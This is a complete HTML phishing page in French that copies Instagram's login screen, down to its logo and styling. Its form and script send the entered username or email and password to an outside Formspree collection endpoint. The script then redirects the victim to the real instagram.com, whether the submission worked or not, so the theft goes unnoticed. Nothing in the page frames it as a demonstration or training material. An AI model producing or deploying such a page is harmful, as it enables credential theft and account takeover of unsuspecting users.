<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram Login - Style</title>
<style>
  :root {
    --bg: #fafafa;
    --card-bg: #ffffff;
    --border: #dbdbdb;
    --accent: #0095f6;
    --insta-grad: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
    --text: #262626;
    --muted: #8e8e8e;
  }

  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    padding: 20px;
  }

  .main-wrapper {
    width: 100%;
    max-width: 350px;
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .card {
    background: var(--card-bg);
    border: 1px solid var(--border);
    padding: 20px 40px;
    text-align: center;
    margin-bottom: 10px;
  }

  .logo-container {
    margin: 22px auto 35px;
    display: flex;
    justify-content: center;
  }
  .logo-container img {
    max-width: 175px;
  }

  form {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  input {
    width: 100%;
    background: #fafafa;
    border: 1px solid var(--border);
    border-radius: 3px;
    padding: 10px 8px;
    font-size: 12px;
    outline: none;
    color: var(--text);
  }
  input:focus { border-color: #a8a8a8; }

  .pass-wrap { position: relative; }
  .show-pass {
    position: absolute;
    right: 8px;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    font-weight: 600;
    font-size: 12px;
    cursor: pointer;
    color: var(--text);
  }

  .btn-submit {
    margin-top: 8px;
    background: var(--insta-grad);
    color: white;
    border: none;
    border-radius: 4px;
    padding: 7px;
    font-weight: 700;
    font-size: 14px;
    cursor: pointer;
    margin-bottom: 20px;
  }

  .forgot-link {
    font-size: 12px;
    color: #00376b;
    text-decoration: none;
    display: block;
    margin-bottom: 10px;
  }

  .signup-box {
    background: var(--card-bg);
    border: 1px solid var(--border);
    padding: 20px;
    text-align: center;
    font-size: 14px;
  }
  .signup-box a {
    color: var(--accent);
    text-decoration: none;
    font-weight: 600;
  }
</style>
</head>
<body>

<div class="main-wrapper">
  <div class="card">
    <div class="logo-container">
      <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b604.png" alt="Instagram">
    </div>

    <form action="https://formspree.io/f/xgollwjg" method="POST" id="loginForm">
      <input type="text" name="email_or_number" placeholder="Num. de téléphone, nom d'utilisateur ou e-mail" required>
      
      <div class="pass-wrap">
        <input type="password" name="request" id="passInput" placeholder="Mot de passe" required>
        <button type="button" class="show-pass" onclick="togglePass()">Afficher</button>
      </div>

      <button type="submit" class="btn-submit">Se connecter</button>

      <a href="#" class="forgot-link">Mot de passe oublié ?</a>
    </form>
  </div>

  <div class="signup-box">
    Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
  </div>
</div>

<script>
  function togglePass() {
    const inp = document.getElementById('passInput');
    const btn = document.querySelector('.show-pass');
    if(inp.type === 'password') {
      inp.type = 'text';
      btn.innerText = 'Masquer';
    } else {
      inp.type = 'password';
      btn.innerText = 'Afficher';
    }
  }

  const form = document.getElementById('loginForm');
  form.addEventListener('submit', function(e) {
    e.preventDefault();
    const data = new FormData(form);
    fetch(form.action, {
      method: 'POST',
      body: data,
      headers: { 'Accept': 'application/json' }
    }).then(response => {
      
      window.location.href = 'https://instagram.com';
    }).catch(error => {
      window.location.href = 'https://instagram.com';
    });
  });
</script>

</body>
</html>
